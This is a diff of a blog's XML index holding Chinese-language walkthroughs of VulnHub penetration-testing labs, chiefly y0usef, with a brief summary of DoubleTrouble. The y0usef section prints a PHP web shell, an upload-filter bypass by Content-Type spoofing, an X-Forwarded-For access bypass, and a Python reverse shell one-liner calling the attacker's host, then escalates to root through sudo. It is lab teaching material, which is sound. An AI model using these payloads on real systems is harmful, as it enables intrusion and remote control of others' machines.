+<p>进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。</p>
+<p><a id="jump7"></a></p>
+<p><code>7</code>: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell</span><br></pre></td></tr></table></figure>
+
+<p><a id="jump8"></a></p>
+<p><code>8</code>: 对于用户的登录shell：</p>
+<p><code>/bin/false</code> 是最严格的禁止login选项，一切服务都不能用，</p>
+<p><code>/bin/nologin</code> 只是不允许系统login，可以使用其他ftp等服务</p>
+<p>因此我们一眼就锁定了<code>yousef</code>用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。</p>
+</li>
+<li><p>第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。</p>
+<p>退出反弹shell，在kali的shell使用以下指令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" alt="image-20220921142200653" style="zoom:67%;" /> 
+
+<p> 成功登入yousef后，查看该用户所在的用户组：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" alt="image-20220921142413525"> </p>
+<p>发现该用户属于sudo组，查看该用户可执行的指令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" alt="image-20220921142645249"> </p>
+<p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure>
+
+<p>查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。</p>
+</li>
+<li><p>至此我们实现了root权限的提取，并成功获取了所有的两个flag。</p>
+</li>
+</ol>
+<p>【完结撒花】</p>
+]]></content>
+      <categories>
+        <category>网络攻防实战</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>Kali</tag>
+        <tag>网络</tag>
+        <tag>安全</tag>
+        <tag>Linux</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【渗透测试】第九周 vulnhub-DoubleTrouble:1</title>
     <url>/vulnhub-doubletrouble/</url>
     <content><![CDATA[<blockquote>
 <p>网络攻防实战 第九次实验</p>
-<p>邮箱：<a href="mailto:&#107;&#x65;&#x65;&#x6b;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#107;&#x65;&#x65;&#x6b;&#107;&#x65;&#119;&#121;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#107;&#107;&#101;&#119;&#x79;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#x6b;&#x65;&#101;&#107;&#107;&#101;&#119;&#x79;&#64;&#x71;&#x71;&#x2e;&#x63;&#111;&#x6d;</a></p>
 <p>靶机链接：<a href="https://www.vulnhub.com/entry/doubletrouble-1,743/">https://www.vulnhub.com/entry/doubletrouble-1,743/</a></p>
 <p>2022年11月15日</p>
 </blockquote>
@@ -3341,212 +3551,6 @@
 <li>浏览器访问 80 端口，发现登录界面。通过 <code>sqlmap</code> 进行 <code>sql</code> 注入，获取用户名和密码，通过 SSH 登入。</li>
 <li>查看靶机内核，发现存在脏牛漏洞，搜索利用代码，上传至靶机编译运行，发现强制修改了 root 用户的密码，使用该密码即可至 root 身份，提权成功。</li>
 </ul>
-]]></content>
-      <categories>
-        <category>网络攻防实战</category>
-      </categories>
-      <tags>
-        <tag>学习</tag>
-        <tag>Kali</tag>
-        <tag>网络</tag>
-        <tag>安全</tag>
-        <tag>Linux</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【渗透测试】第一周 vulnhub-y0usef</title>
-    <url>/vulnhub-y0usef/</url>
-    <content><![CDATA[<blockquote>
-<p>第一周</p>
-<p>可弟WZ</p>
-<p>主页：blog.kekwy.com</p>
-<p>邮箱：<a href="mailto:&#107;&#x65;&#x65;&#x6b;&#107;&#101;&#x77;&#121;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">&#107;&#x65;&#x65;&#x6b;&#107;&#101;&#x77;&#121;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;</a></p>
-<p>2022年9月27日</p>
-</blockquote>
-<h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
-<p>下载链接：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">https://www.vulnhub.com/entry/y0usef-1,624/</a></p>
-<p>攻击机：kali</p>
-<h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>取得目标靶机的root权限和2个flag。</p>
-<h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><ol>
-<li><p>在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。</p>
-</li>
-<li><p>在kali中执行以下指令进行局域网主机发现：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" alt="image-20220921103912013"> </p>
-<p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p>
-<p><a id="jump1"></a></p>
-<p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p>
-</li>
-<li><p>在kali中执行以下指令扫描靶机的端口状态：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" alt="image-20220921083225282"> </p>
-<p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><a id="jump2"></a></p>
-<p><code>2:</code> <code>-p</code> 对指定端口扫描</p>
-<p>​	    <code>-sV -sC</code> 默认安全脚本扫描</p>
-<p>扫描结果如下：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" alt="image-20220921111148084"> </p>
-</li>
-<li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" alt="image-20220921111747118"> </p>
-<p> 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p>
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" alt="image-20220921112049063" style="zoom:67%;" /> 
-
-<p>但令人遗憾的是，我们并不能查看该文件。</p>
-<p><a id="jump3"></a></p>
-<p><code>3:</code> Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。</p>
-</li>
-<li><p>使用whatweb工具查看web应用所采用的软件构架：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" alt="image-20220921151941056"> </p>
-<p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" alt="image-20220921091507301" style="zoom: 50%;" /> 
-
-<p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure>
-
-<p>其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。</p>
-<p><a id="jump4"></a></p>
-<p><code>4:</code> HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。</p>
-<p>上述结果中出现的状态码的含义分别为：</p>
-<table>
-<thead>
-<tr>
-<th>状态码</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>403</td>
-<td>(禁止)服务器拒绝请求。</td>
-</tr>
-<tr>
-<td>301</td>
-<td>(永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</td>
-</tr>
-<tr>
-<td>200</td>
-<td>(成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>访问<code>10.0.2.5/adminstration</code>：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" alt="image-20220921114137208"> </p>
-<p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p>
-<p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p>
-<p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" alt="image-20220921124711969"> </p>
-<p>发现成功进入一个登录界面：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" alt="image-20220921124805448"> </p>
-<p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" alt="image-20220921130249392">  </p>
-<p><a id="jump5"></a></p>
-<p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p>
-</li>
-<li><p>简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。</p>
-<p>首先编写一个“一句话木马”的PHP 文件<code>shell.php</code>，内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>尝试直接将其上传，发现网站提示文件被拒绝：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" alt="image-20220921130902640"> </p>
-<p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" alt="image-20220921131442789"> </p>
-<p>修改为：<code>image/png</code>：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" alt="image-20220921131518489"> </p>
-<p>文件上传成功了，并提供了上传完成的文件的URL。</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" alt="image-20220921131734558"> </p>
-<p><a id="jump6"></a></p>
-<p><code>6:</code> 常见的过滤形式与绕过方法：</p>
-<ol>
-<li>针对文件扩展名的绕过：</li>
-</ol>
-<p>修改文件扩展名后，再上传。</p>
-<p>2)针对文件类型的绕过：</p>
-<p>修改报文中的<code>Content-Type</code>字段（如本次实验）。</p>
-<p>3)针对文件内容的绕过：</p>
-<p>在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。</p>
-</li>
-<li><p>通过URL访问文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php</span><br></pre></td></tr></table></figure>
-
-<p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" alt="image-20220921133834453"> </p>
-<p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure>
-
-<p>得到了靶机上的python路径，说明靶机有python环境：</p>
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" alt="image-20220921134349689"> </p>
-<p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure>
-
-<p>修改对应的python代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p>
-<p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p>
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" alt="image-20220921140145500" style="zoom:67%;" /> 
-
-<p>使用以下指令对反弹shell进行一个简单的升级: </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" alt="image-20220921140419911"> </p>
-</li>
-<li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure>
-
-<p>注意到有以下一项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>说明有一个叫<code>yousef</code>的用户可以登录系统<sup>8</sup>，且主目录为<code>/home/yousef</code>。</p>
-<p>进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。</p>
-<p><a id="jump7"></a></p>
-<p><code>7</code>: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell</span><br></pre></td></tr></table></figure>
-
-<p><a id="jump8"></a></p>
-<p><code>8</code>: 对于用户的登录shell：</p>
-<p><code>/bin/false</code> 是最严格的禁止login选项，一切服务都不能用，</p>
-<p><code>/bin/nologin</code> 只是不允许系统login，可以使用其他ftp等服务</p>
-<p>因此我们一眼就锁定了<code>yousef</code>用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。</p>
-</li>
-<li><p>第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。</p>
-<p>退出反弹shell，在kali的shell使用以下指令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure>
-
-<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" alt="image-20220921142200653" style="zoom:67%;" /> 
-
-<p> 成功登入yousef后，查看该用户所在的用户组：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" alt="image-20220921142413525"> </p>
-<p>发现该用户属于sudo组，查看该用户可执行的指令：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" alt="image-20220921142645249"> </p>
-<p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure>
-
-<p>查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。</p>
-</li>
-<li><p>至此我们实现了root权限的提取，并成功获取了所有的两个flag。</p>
-</li>
-</ol>
-<p>【完结撒花】</p>
 ]]></content>
       <categories>
         <category>网络攻防实战</category>
